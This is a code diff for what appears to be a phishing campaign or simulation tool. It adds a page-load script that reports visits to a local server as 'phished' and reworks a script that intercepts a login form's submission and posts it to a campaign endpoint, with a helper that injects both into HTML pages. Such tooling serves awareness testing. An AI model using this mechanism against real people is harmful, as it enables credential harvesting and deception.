@@ -1,7 +1,33 @@
+# When the user connect to the page, to get num of users reached the page (before submit creds)
+def create_js_phised_script(user_id, campaign_name):
+    js_script = """
+    <script>
+        document.addEventListener("DOMContentLoaded", async function () {
+            try {
+    """
+    
+    js_script += f"await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}/phished`"
+    
+    js_script +="""
+        , {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            }
+        });
+            console.log("Phished number updated successfully!");
+        } catch (error) {
+            console.error("Error updating phished number:", error);
+        }
+    });
+    </script>
+"""
+
+    return js_script
 
 def create_js_script(user_id, campaign_name):
-
-    js_code = """
+    js_script = create_js_phised_script(user_id, campaign_name)
+    js_script += """
         <script>
             document.getElementById("loginForm").addEventListener("submit", async function(event) {
                 event.preventDefault(); 
@@ -20,8 +46,8 @@ def create_js_script(user_id, campaign_name):
                 
             try {
         """
-    js_code += f"const response = await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}`"
-    js_code += """, 
+    js_script += f"const response = await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}`"
+    js_script += """, 
             {
                 method: 'POST',
                 headers: {
@@ -42,7 +68,7 @@ def create_js_script(user_id, campaign_name):
         </script>
         """
 
-    return js_code
+    return js_script
 
 def add_script_to_html(html_path: str, script: str) -> str:
     try:
